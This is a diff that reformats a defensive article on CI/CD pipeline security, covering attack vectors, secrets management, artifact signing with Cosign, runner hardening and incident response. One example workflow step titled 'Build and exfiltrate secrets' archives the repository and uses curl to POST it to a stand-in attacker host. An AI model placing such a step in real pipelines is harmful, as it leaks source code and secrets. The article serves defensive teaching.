@@ -56,36 +56,12 @@ CI/CD pipelines are the nervous system of modern software delivery: automated, h
 ```text
 # .github/workflows/ci.yml
 jobs:
-  
-build:
-    
-runs-on:
- 
-ubuntu-latest
-    
-steps:
-      
--
- 
-uses:
- 
-actions/checkout@v4
-      
--
- 
-name:
- 
-Build
- 
-and
- 
-exfiltrate
- 
-secrets
-        
-run:
- 
-|
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Build and exfiltrate secrets
+        run: |
           tar -czf /tmp/code.tgz .
           curl -X POST https://evil.example/upload -F file=@/tmp/code.tgz
 ```
@@ -98,7 +74,7 @@ run:
 
 **Tools / Mitigations**:
 
-- Use**SBOM**tooling (Syft) and vulnerability scanning (Grype/Trivy).
+- Use **SBOM** tooling (Syft) and vulnerability scanning (Grype/Trivy).
 
 - Enforce private registry usage and prevent accidental fallback to the public registry.
 
@@ -108,9 +84,9 @@ run:
 
 **Detection & tools**:
 
-- **Gitleaks**,**truffleHog**to scan repo history and PRs.
+- **Gitleaks**, **truffleHog** to scan repo history and PRs.
 
-- GitHub**secret scanning**, GitLab secret detection, or**Snyk Code**.
+- GitHub **secret scanning**, GitLab secret detection, or **Snyk Code**.
 
 ### D. Build agent takeover (docker socket, vulnerable base images)
 
@@ -118,21 +94,21 @@ run:
 
 **Examples of bad practice**:
 
-- Self-hosted runner with`/var/run/docker.sock`mounted and cached credentials in`/root/.aws/credentials`.
+- Self-hosted runner with `/var/run/docker.sock` mounted and cached credentials in `/root/.aws/credentials`.
 
 **Mitigations**:
 
-- Avoid mounting host Docker socket — use**Kaniko**,**buildah**, or**kaniko-in-cluster**for container builds.
+- Avoid mounting host Docker socket — use **Kaniko**, **buildah**, or **kaniko-in-cluster** for container builds.
 
 - Use ephemeral runners (Kubernetes pods) and redeploy them cleanly per job.
 
 ### E. Artifact repository compromise (Nexus, Artifactory, GitHub Packages)
 
-**What**: Replace artifacts or publish tampered images with a`latest`tag that pipelines pull.
+**What**: Replace artifacts or publish tampered images with a `latest` tag that pipelines pull.
 
 **Mitigations**:
 
-- Sign artifacts with**Sigstore / Cosign**and validate signatures in deploy pipelines.
+- Sign artifacts with **Sigstore / Cosign** and validate signatures in deploy pipelines.
 
 - Lock immutability policies on registries (immutable tags).
 
@@ -143,15 +119,15 @@ Below are layered defenses mapped to common attack vectors. Use multiple at once
 ### Identity & credentials: short-lived, auditable tokens
 
 - **Use OIDC / short-lived credentials**: GitHub Actions, GitLab CI and Azure Pipelines support OIDC tokens to request cloud STS credentials (no long-lived secrets).
-**GitHub Actions → AWS STS example (workflow snippet)**:
+ **GitHub Actions → AWS STS example (workflow snippet)**:
 
 - `permissions: id-token: write contents: read jobs: deploy: runs-on: ubuntu-latest steps: - name: Configure AWS credentials uses: aws-actions/configure-aws-credentials@v2 with: role-to-assume: arn:aws:iam::123456789012:role/GitHubActionsRole aws-region: us-east-1`
 
-- **HashiCorp Vault**with dynamic secrets: issue DB and cloud creds on demand; rotate automatically.
+- **HashiCorp Vault** with dynamic secrets: issue DB and cloud creds on demand; rotate automatically.
 
 ### Secrets management
 
-- Centralize secrets:**Vault**,**AWS Secrets Manager**,**Azure Key Vault**, or**GCP Secret Manager**.
+- Centralize secrets: **Vault**, **AWS Secrets Manager**, **Azure Key Vault**, or **GCP Secret Manager**.
 
 - Inject secrets at runtime via vault agents or environment-providers (not via plain env vars checked into code).
 
@@ -159,7 +135,7 @@ Below are layered defenses mapped to common attack vectors. Use multiple at once
 
 - **Sigstore / Cosign + Rekor**: sign container images and verify signatures during deployment.
 
-- Generate**SBOMs**with**Syft**and scan with**Grype**/**Trivy**during CI.
+- Generate **SBOMs** with **Syft** and scan with **Grype** / **Trivy** during CI.
 
 - Example: Sign image after build:
 
@@ -167,61 +143,61 @@ Below are layered defenses mapped to common attack vectors. Use multiple at once
 
 ### Pipeline hardening & policy
 
-- Treat pipeline definitions as code: require**PR review**and branch protection on`.github/workflows/*`.
+- Treat pipeline definitions as code: require **PR review** and branch protection on `.github/workflows/*`.
 
-- Use**policy-as-code**:
+- Use **policy-as-code**:
 
-- **Open Policy Agent (OPA)/Gatekeeper**for Kubernetes admission controls.
+- **Open Policy Agent (OPA)/Gatekeeper** for Kubernetes admission controls.
 
-- **Conftest**,**Terraform Sentinel**, or**OPA**checks integrated in CI to block dangerous pipeline changes.
+- **Conftest**, **Terraform Sentinel**, or **OPA** checks integrated in CI to block dangerous pipeline changes.
 
 - Enforce least privilege for runner tokens and repository permissions.
 
 ### Static & dynamic analysis (tooling)
 
-- **SAST / Secret Scanning**: GitHub Advanced Security,**Gitleaks**,**TruffleHog**,**Snyk**,**Checkmarx**.
+- **SAST / Secret Scanning**: GitHub Advanced Security, **Gitleaks**, **TruffleHog**, **Snyk**, **Checkmarx**.
 
-- **Container/Image scanning**:**Trivy**,**Clair**,**Anchore**,**Aqua**.
+- **Container/Image scanning**: **Trivy**, **Clair**, **Anchore**, **Aqua**.
 
-- **IaC scanning**:**Checkov**,**tfsec**,**terrascan**.
+- **IaC scanning**: **Checkov**, **tfsec**, **terrascan**.
 
 ### Protect runners / build hosts
 
-- Use**ephemeral runners**: GitHub Actions self-hosted runners on Kubernetes using**act-runner-controller**or GitLab Kubernetes runners.
+- Use **ephemeral runners**: GitHub Actions self-hosted runners on Kubernetes using **act-runner-controller** or GitLab Kubernetes runners.
 
 - Restrict network egress for runners (deny-list external destinations) — allow only necessary registries and artifact stores.
 
-- Run runners in**isolated namespaces**, no access to production secrets.
+- Run runners in **isolated namespaces**, no access to production secrets.
 
 ### Logging, detection & runtime controls
 
-- Ship CI logs to central observability:**XPLG /ELK / Splunk**. Correlate with identity logs.
+- Ship CI logs to central observability: **XPLG /ELK / Splunk** . Correlate with identity logs.
 
-- Use**Falco**to detect suspicious container activity on runner hosts (sudden outbound to unusual domains, process injection).
+- Use **Falco** to detect suspicious container activity on runner hosts (sudden outbound to unusual domains, process injection).
 
-- Add**audit logging**for artifact registries and cloud API calls.
+- Add **audit logging** for artifact registries and cloud API calls.
 
 ### 4) Example defenses in a flow — an end-to-end sequence
 
 - Developer opens PR to change code or workflow.
 
-- **Checks**: PR trigger runs**gitleaks**,**Conftest**policy checks on workflow files.
+- **Checks**: PR trigger runs **gitleaks**, **Conftest** policy checks on workflow files.
 
 - If workflow files changed, require manual approval from infra/security team (branch protection).
 
 2. Build runs on ephemeral Kubernetes runner.
 
-- Runner fetches dynamic credentials via**OIDC → AWS STS**(no stored secrets).
+- Runner fetches dynamic credentials via **OIDC → AWS STS** (no stored secrets).
 
-- Container built using**Kaniko**, produces an SBOM (Syft) and scanned with**Trivy**.
+- Container built using **Kaniko**, produces an SBOM (Syft) and scanned with **Trivy**.
 
-- Image signed via**Cosign**and published to registry with immutability.
+- Image signed via **Cosign** and published to registry with immutability.
 
 3. Deployment pipeline verifies Cosign signature and SBOM.
 
 - Any mismatch or vulnerability above threshold blocks deploy.
 
-4. Monitoring: Falco + ELK alert on unusual outbound traffic or attempts to call`cosign verify`failures.
+4. Monitoring: Falco + ELK alert on unusual outbound traffic or attempts to call `cosign verify` failures.
 
 ### 5) Detection & incident response (playbook outline)
 
@@ -231,7 +207,7 @@ Below are layered defenses mapped to common attack vectors. Use multiple at once
 
 - Unexpected runner activity: large archive uploads, unknown outbound connections, process dumping.
 
-- Registry events: unexpected uploads, re-tagging of`latest`.
+- Registry events: unexpected uploads, re-tagging of `latest`.
 
 **Contain**
 
@@ -275,7 +251,7 @@ Below are layered defenses mapped to common attack vectors. Use multiple at once
 
 - Use ephemeral runners in k8s — destroy and rebuild regularly.
 
-- Block access to`/var/run/docker.sock`(use kaniko/buildah).
+- Block access to `/var/run/docker.sock` (use kaniko/buildah).
 
 - Centralize logs and create CI-specific detection rules (e.g., many outbound connections from runner).
 
@@ -301,17 +277,13 @@ Below are layered defenses mapped to common attack vectors. Use multiple at once
 
 ### 8) Example: enforce OIDC + Cosign verification in GitHub Actions
 
-**1) Use OIDC to get AWS role**(see snippet above).
-**2) Sign image with Cosign in the build job**:
+**1) Use OIDC to get AWS role** (see snippet above).
+ **2) Sign image with Cosign in the build job**:
 
 ```text
 - name: Sign image
   run: |
-    cosign sign --key 
-${{ secrets.COSIGN_KEY }
-} ghcr.io/org/myimage:
-${{ github.sha }
-}
+    cosign sign --key ${{ secrets.COSIGN_KEY }} ghcr.io/org/myimage:${{ github.sha }}
 ```
 
 **3) Verify signature in deploy job**:
@@ -319,13 +291,11 @@ ${{ github.sha }
 ```text
 - name: Verify signature
   run: |
-    cosign verify --key cosign.pub ghcr.io/org/myimage:
-${{ github.sha }
-}
+    cosign verify --key cosign.pub ghcr.io/org/myimage:${{ github.sha }}
 ```
 
 *(Prefer using a remote key management pattern with Cosign KMS integrations rather than storing private keys in repo secrets)*
 
 ## Conclusion — stop thinking of CI/CD as “less important”
 
-CI/CD systems are no longer peripheral tooling — they are critical infrastructure. The modern attacker knows this and will target the weakest links: misconfigured runners, exposed secrets, unsigned artifacts, and lenient pipeline policies. Defend by combining**least privilege**,**ephemeral infrastructure**,**supply-chain integrity (SBOM + signing)**, and**proactive detection**.
+CI/CD systems are no longer peripheral tooling — they are critical infrastructure. The modern attacker knows this and will target the weakest links: misconfigured runners, exposed secrets, unsigned artifacts, and lenient pipeline policies. Defend by combining **least privilege**, **ephemeral infrastructure**, **supply-chain integrity (SBOM + signing)**, and **proactive detection**.
